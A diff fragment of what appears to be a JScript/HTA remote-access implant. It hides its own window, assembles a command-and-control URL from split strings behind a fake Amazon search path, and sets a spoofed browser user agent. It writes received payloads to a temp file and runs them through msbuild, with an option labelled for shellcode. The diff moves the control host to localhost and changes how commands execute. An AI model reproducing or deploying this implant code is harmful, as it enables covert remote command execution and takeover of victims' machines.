@@ -5,12 +5,11 @@ window.blur();
 window.resizeTo(6, 9);
 
 //Define variables
-var ho = "192.168"
-var me = ".0.33"
+var ipp = "127.0.0.1"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
-var home = proto+ho+me+":"+p0rt+uri
+var home = proto+ipp+":"+p0rt+uri
 var sleepytime = 3000 //in milliseconds
 
 var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
@@ -191,11 +190,11 @@ function main()
         fd.WriteLine(msbdata)
         fd.close()
         if((jsObject.cmnd.split(" ")[0] == "shc")) {
-          runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt", 0, true)
+          runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
           retval = "[*] Shc cmnd appeared successful"
         }
         else {
-          runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+          runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
         }
         if(fso.FileExists(temp + "\\__" + id + ".txt")) {
           fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
